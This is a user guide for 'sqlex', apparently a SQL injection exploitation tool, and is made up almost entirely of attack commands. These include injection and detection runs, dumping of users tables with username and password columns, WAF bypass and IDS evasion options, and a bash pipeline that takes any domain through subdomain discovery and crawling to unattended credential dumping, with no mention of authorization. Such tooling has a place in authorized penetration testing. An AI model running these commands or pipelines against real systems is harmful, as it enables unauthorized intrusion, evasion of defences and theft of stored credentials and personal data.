# sqlex — User Guide

## Table of Contents

1. [Installation](#installation)
2. [Core Concepts](#core-concepts)
3. [Basic Usage](#basic-usage)
4. [Detection Techniques](#detection-techniques)
5. [Enumeration & Data Extraction](#enumeration--data-extraction)
6. [Advanced Injection Control](#advanced-injection-control)
7. [Session Resumption](#session-resumption)
8. [Tool Chaining](#tool-chaining)
   - [nuclei → sqlex](#nuclei--sqlex)
   - [subfinder + httpx + sqlex](#subfinder--httpx--sqlex)
   - [katana + sqlex](#katana--sqlex)
   - [ffuf + sqlex](#ffuf--sqlex)
   - [Burp Suite + sqlex](#burp-suite--sqlex)
   - [Full Automated Pipeline](#full-automated-pipeline)
9. [Flag Reference](#flag-reference)

---

## Installation

```sh
go install github.com/SobhanYasami/sqlex/cmd/sqlex@latest
```

Verify:

```sh
sqlex --version   # or just: sqlex
```

---

## Core Concepts

**Injection point** — the parameter sqlex actually injects into. Marked with `*` for explicit control, auto-detected otherwise.

**Vector** — the full SQL fragment including prefix/suffix wrappers: `' AND [INFERENCE]-- -`

**Technique codes**:

| Code | Name | When to use |
| --- | --- | --- |
| `B` | Boolean-based blind | Response differs true/false but no data leaks |
| `E` | Error-based | DB errors reflected in response body |
| `T` | Time-based blind | Fully blind, no visible difference in responses |

**Operators** (how characters are extracted):

| Name | SQL | Speed |
| --- | --- | --- |
| `greater` | `ASCII(SUBSTR(...,pos,1))>mid` | Fast (log₂ n queries/char) |
| `between` | `ASCII(...) NOT BETWEEN 0 AND mid` | Same as greater |
| `in` | `ASCII(...) IN (chunk)` | Fastest on fast links |
| `equal` | `ASCII(...) = val` | Slowest, most compatible |

---

## Basic Usage

### Detect injection

```sh
# GET parameter
sqlex -u "http://target/item?id=1"

# POST form
sqlex -u "http://target/login" -d "user=admin&pass=test"

# JSON body
sqlex -u "http://api.target/search" \
      -d '{"q":"test"}' \
      -H "Content-Type: application/json"

# Cookie parameter
sqlex -u "http://target/dash" --cookie "session=abc; uid=1"
```

### Force a specific parameter

```sh
# Test only 'id', skip everything else
sqlex -u "http://target/item?id=1&page=2" --test-parameter id

# Explicit injection marker — sqlex injects at * only
sqlex -u "http://target/item?id=1*&page=2"
sqlex -u "http://target/item?id=1" --cookie "uid=5*; lang=en"
```

### Load from Burp

Save the raw request from Burp Repeater to a file, then:

```sh
sqlex -r /tmp/req.txt
```

---

## Detection Techniques

### Boolean-based blind

Default. Works when the page differs between true/false conditions — different content length, text, status code.

```sh
sqlex -u "http://target/item?id=1" -t B
```

Tune the comparison signal:

```sh
# Match on specific string present in true response
sqlex -u "http://target/item?id=1" --string "Welcome"

# Match on string absent in true response
sqlex -u "http://target/item?id=1" --not-string "Error"

# Match on HTTP status code
sqlex -u "http://target/item?id=1" --code 200

# Pure text diff (ignore HTML noise)
sqlex -u "http://target/item?id=1" --text-only
```

### Error-based

Fastest extraction. DB error message carries the value directly.

```sh
sqlex -u "http://target/item?id=1" -t E
sqlex -u "http://target/item?id=1" -t BE   # try error first, fall back to boolean
```

### Time-based blind

When the page is completely static regardless of query result.

```sh
sqlex -u "http://target/item?id=1" -t T

# Increase sleep to beat high-latency targets
sqlex -u "http://target/item?id=1" -t T --time-sec 8 --timeout 15

# Confirm detection against flaky networks
sqlex -u "http://target/item?id=1" -t T --retries 5
```

### Force DBMS

Skips fingerprint phase, smaller payload set:

```sh
sqlex -u "http://target/item?id=1" --dbms MySQL
sqlex -u "http://target/item?id=1" --dbms PostgreSQL
sqlex -u "http://target/item?id=1" --dbms "Microsoft SQL Server"
sqlex -u "http://target/item?id=1" --dbms Oracle
```

---

## Enumeration & Data Extraction

Enumeration only runs after a vulnerability is confirmed.

### Fingerprint the server

```sh
sqlex -u "http://target/item?id=1" \
      --banner --current-user --current-db --hostname
```

### Databases → Tables → Columns → Dump

```sh
# 1. List databases
sqlex -u "http://target/item?id=1" --dbs

# 2. List tables in target DB
sqlex -u "http://target/item?id=1" -D shopdb --tables

# 3. List columns in target table
sqlex -u "http://target/item?id=1" -D shopdb -T users --columns

# 4. Dump everything
sqlex -u "http://target/item?id=1" -D shopdb -T users --dump

# 5. Dump specific columns only
sqlex -u "http://target/item?id=1" -D shopdb -T users \
      -C "username,password,email" --dump

# 6. Paginate large tables (rows 51–100)
sqlex -u "http://target/item?id=1" -D shopdb -T orders \
      --dump --start 51 --stop 100
```

### Speed up extraction

```sh
# Parallel character extraction (8 goroutines)
sqlex -u "http://target/item?id=1" -D shopdb -T users --dump --threads 8

# Force fastest operator
sqlex -u "http://target/item?id=1" --fetch-using between --threads 8 --dump \
      -D shopdb -T users
```

### Full one-shot recon

```sh
sqlex -u "http://target/item?id=1" \
      --banner --current-user --current-db --hostname \
      --dbs --batch --random-agent --threads 4
```

---

## Advanced Injection Control

### Prefix / Suffix

When the injection point is inside quotes, parentheses, or a subquery:

```sh
# Value inside single quotes: id='1'
sqlex -u "http://target/item?id=1" --prefix "'" --suffix "-- -"

# Inside double quotes and parentheses: WHERE id=("1")
sqlex -u "http://target/item?id=1" --prefix "')" --suffix "-- -"

# Second-order / stacked context
sqlex -u "http://target/item?id=1" --prefix "';SELECT 1-- " --suffix ""
```

### Encoding and WAF bypass

```sh
# Skip URL encoding (WAF decodes twice)
sqlex -u "http://target/item?id=1" --skip-urlencode

# Keep specific chars unencoded (e.g. space → %20 but keep commas)
sqlex -u "http://target/item?id=1" --safe-chars ","

# Route through Burp for manual WAF analysis
sqlex -u "http://target/item?id=1" --proxy http://127.0.0.1:8080
```

### Rate limiting / IDS evasion

```sh
# 2-second delay between requests
sqlex -u "http://target/item?id=1" --delay 2

# Random User-Agent per request
sqlex -u "http://target/item?id=1" --random-agent

# Mobile UA fingerprint
sqlex -u "http://target/item?id=1" --mobile
```

### Header injection

```sh
sqlex -u "http://target/" \
      -H "X-Forwarded-For: 1.2.3.4*" \
      -H "User-Agent: Mozilla/5.0"
```

Placing `*` in a header value forces sqlex to test that header as injection point.

---

## Session Resumption

sqlex stores injection fingerprints and partial extraction results under `~/.sqlex/<host>/<hash>/session.sqlite`.

```sh
# First run — detects injection, starts dump, interrupted at row 40
sqlex -u "http://target/item?id=1" -D shopdb -T users --dump

# Re-run same command — resumes from row 41, skips re-detection
sqlex -u "http://target/item?id=1" -D shopdb -T users --dump

# Ignore cached characters, re-extract (injection fingerprint kept)
sqlex -u "http://target/item?id=1" -D shopdb -T users --dump --fresh-queries

# Nuke everything, start completely fresh
sqlex -u "http://target/item?id=1" --flush-session --dbs
```

Dump output is saved as CSV under `~/.sqlex/<host>/<hash>/dump/<db>/<table>.csv`.

---

## Tool Chaining

### nuclei → sqlex

Nuclei finds SQLi-vulnerable endpoints; sqlex exploits them.

**sqlex nuclei template** — save as `~/.config/nuclei/templates/sqlex-feed.yaml`:

```yaml
id: sqlex-feed

info:
  name: SQLi candidate for sqlex
  author: you
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: regex
        part: body
        regex:
          - "SQL syntax|mysql_fetch|ORA-[0-9]{5}|pg_query|sqlite3_exec"
          - "You have an error in your SQL"
          - "Unclosed quotation mark"
          - "quoted string not properly terminated"
```

**Pipeline**:

```sh
# 1. Run nuclei sqli templates against a target list
nuclei -l targets.txt \
       -t ~/nuclei-templates/vulnerabilities/generic/sql-injection.yaml \
       -t ~/nuclei-templates/vulnerabilities/other/sqli-error-based.yaml \
       -o nuclei-sqli.txt -silent

# 2. Extract URLs from nuclei output → feed to sqlex
grep "sqli\|sql-injection" nuclei-sqli.txt \
  | awk '{print $NF}' \
  | sort -u > sqli-candidates.txt

# 3. Run sqlex against each candidate
while IFS= read -r url; do
  echo "[*] Testing: $url"
  sqlex -u "$url" --dbs --batch --random-agent --threads 4 2>&1 \
    | tee -a sqlex-results.txt
done < sqli-candidates.txt
```

**Parallel version** (xargs, 5 concurrent):

```sh
cat sqli-candidates.txt | xargs -P 5 -I{} \
  sqlex -u "{}" --banner --current-db --batch --random-agent
```

---

### subfinder + httpx + sqlex

Full subdomain-to-exploit pipeline:

```sh
# 1. Enumerate subdomains
subfinder -d target.com -silent -o subs.txt

# 2. Probe live hosts, keep only 200/301/302 with response body
httpx -l subs.txt -mc 200,301,302 -silent \
      -path "/index.php?id=1" \
      -o live-with-params.txt

# 3. Detect injection across all live endpoints
while IFS= read -r url; do
  sqlex -u "$url" -t BE --batch --random-agent --threads 4 \
        --current-db 2>&1 | grep -E "SUCCESS|current database" \
    && echo "$url" >> confirmed-sqli.txt
done < live-with-params.txt

# 4. Dump from confirmed targets
while IFS= read -r url; do
  sqlex -u "$url" --dbs --batch --threads 8 2>&1
done < confirmed-sqli.txt
```

---

### katana → sqlex

katana crawls and surfaces parameterised URLs; sqlex tests them.

```sh
# 1. Crawl target, output only URLs with query params
katana -u "http://target.com" -d 4 -jc -ef css,png,jpg,svg \
       -o katana-urls.txt -silent

grep "?" katana-urls.txt | sort -u > param-urls.txt

# 2. Feed to sqlex
while IFS= read -r url; do
  sqlex -u "$url" -t BE --batch --random-agent \
        --current-db 2>&1 | tee -a sqlex-scan.log
done < param-urls.txt

# 3. Extract confirmed hits
grep "SUCCESS" sqlex-scan.log
```

---

### ffuf + sqlex

ffuf fuzzes for injectable endpoints; sqlex exploits confirmed ones.

```sh
# 1. Find endpoints that behave differently with SQLi markers
ffuf -u "http://target/FUZZ?id=1'" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200 -fs 0 \
     -o ffuf-sqli-candidates.json -of json

# 2. Parse ffuf output → URLs
jq -r '.results[].url' ffuf-sqli-candidates.json > endpoints.txt

# 3. Test each
while IFS= read -r url; do
  # strip the injected quote, let sqlex handle it
  clean="${url%\'}"
  sqlex -u "$clean" -t BE --batch --dbs 2>&1
done < endpoints.txt
```

---

### Burp Suite + sqlex

**Workflow**: Burp intercepts → save raw request → sqlex exploits.

```sh
# In Burp Repeater: right-click → "Save item" → /tmp/burp-req.txt

# Test saved request
sqlex -r /tmp/burp-req.txt -t BE --batch

# Dump through Burp proxy (see all traffic in Burp HTTP history)
sqlex -r /tmp/burp-req.txt \
      --proxy http://127.0.0.1:8080 \
      -D shopdb -T users --dump --threads 2

# WAF analysis: route through Burp, pause on each request
sqlex -r /tmp/burp-req.txt \
      --proxy http://127.0.0.1:8080 \
      --delay 1 --skip-urlencode
```

---

### Full Automated Pipeline

End-to-end: domain → confirmed SQLi → dumped credentials.

```sh
#!/usr/bin/env bash
# usage: ./sqlex-pipeline.sh target.com

TARGET="${1:?usage: $0 target.com}"
OUTDIR="./results/$TARGET"
mkdir -p "$OUTDIR"

echo "[1] Subdomains"
subfinder -d "$TARGET" -silent -o "$OUTDIR/subs.txt"
echo "    Found: $(wc -l < "$OUTDIR/subs.txt") hosts"

echo "[2] Live hosts"
httpx -l "$OUTDIR/subs.txt" -silent -mc 200,301,302 \
      -o "$OUTDIR/live.txt"

echo "[3] Crawl for params"
while IFS= read -r host; do
  katana -u "$host" -d 3 -jc -silent 2>/dev/null
done < "$OUTDIR/live.txt" \
  | grep "?" | sort -u > "$OUTDIR/param-urls.txt"
echo "    Param URLs: $(wc -l < "$OUTDIR/param-urls.txt")"

echo "[4] nuclei SQLi scan"
nuclei -l "$OUTDIR/param-urls.txt" \
       -t ~/nuclei-templates/vulnerabilities/ \
       -tags sqli -silent \
       -o "$OUTDIR/nuclei-sqli.txt" 2>/dev/null
grep -oP 'https?://[^\s]+' "$OUTDIR/nuclei-sqli.txt" \
  | sort -u > "$OUTDIR/nuclei-candidates.txt"

echo "[5] sqlex detection pass"
while IFS= read -r url; do
  result=$(sqlex -u "$url" -t BE --batch --random-agent \
                 --current-db --threads 4 2>&1)
  if echo "$result" | grep -q "SUCCESS"; then
    echo "$url" >> "$OUTDIR/confirmed.txt"
    echo "$result" >> "$OUTDIR/confirmed-details.txt"
  fi
done < "$OUTDIR/param-urls.txt"
echo "    Confirmed: $(wc -l < "$OUTDIR/confirmed.txt" 2>/dev/null || echo 0)"

echo "[6] sqlex dump from confirmed targets"
while IFS= read -r url; do
  sqlex -u "$url" --dbs --batch --random-agent --threads 8 2>&1 \
    | tee -a "$OUTDIR/dump.log"
done < "$OUTDIR/confirmed.txt"

echo "[done] Results in $OUTDIR/"
```

---

## Flag Reference

### Target

| Flag | Short | Description |
| --- | --- | --- |
| `--url` | `-u` | Target URL |
| `--data` | `-d` | POST body |
| `--cookie` | | Cookie header |
| `--headers` | `-H` | Extra headers (newline-sep `Key: Value`) |
| `--proxy` | | HTTP proxy |
| `--request-file` | `-r` | Raw Burp/curl request file |
| `--bulk-file` | `-m` | One URL per line |

### Detection

| Flag | Default | Description |
| --- | --- | --- |
| `--technique` / `-t` | `BT` | `B` boolean · `E` error · `T` time |
| `--dbms` | | Force DBMS |
| `--level` | `1` | Payload depth 1–5 |
| `--test-parameter` | | Test only this param |
| `--prefix` | | Payload prefix |
| `--suffix` | | Payload suffix |
| `--string` | | True-response string anchor |
| `--not-string` | | False-response string anchor |
| `--code` | | True-response HTTP code |
| `--text-only` | | Text-only comparison |

### Request

| Flag | Default | Description |
| --- | --- | --- |
| `--delay` | `0` | Seconds between requests |
| `--timeout` | `30` | Connection timeout |
| `--time-sec` | `5` | Sleep for time-based |
| `--retries` | `3` | Retry on timeout |
| `--threads` | `1` | Parallel extraction goroutines |
| `--skip-urlencode` | | Raw payloads |
| `--safe-chars` | | Chars exempt from encoding |
| `--random-agent` | | Random UA |
| `--mobile` | | Mobile UA |
| `--follow-redirect` | | `true`/`false` |
| `--force-ssl` | | Force HTTPS |

### Extraction

| Flag | Description |
| --- | --- |
| `--fetch-using` | `greater` / `between` / `in` / `equal` |

### Session

| Flag | Description |
| --- | --- |
| `--flush-session` | Nuke session, restart |
| `--fresh-queries` | Re-extract (keep injection fingerprint) |
| `--session-dir` | Override session path |

### Enumeration

| Flag | Short | Description |
| --- | --- | --- |
| `--banner` | | DBMS version |
| `--current-user` | | DB user |
| `--current-db` | | Current DB name |
| `--hostname` | | Server hostname |
| `--dbs` | | All databases |
| `--tables` | | Tables in `--db` |
| `--columns` | | Columns in `--db`/`--table` |
| `--dump` | | Dump rows |
| `--count` | | Row count only |
| `--db` | `-D` | Target database |
| `--table` | `-T` | Target table |
| `--col` | `-C` | Columns (comma-sep) |
| `--start` | | First row (1-based) |
| `--stop` | | Last row |

### Misc

| Flag | Short | Description |
| --- | --- | --- |
| `--batch` | `-b` | Non-interactive |
| `--verbose` | `-v` | 0–6 |
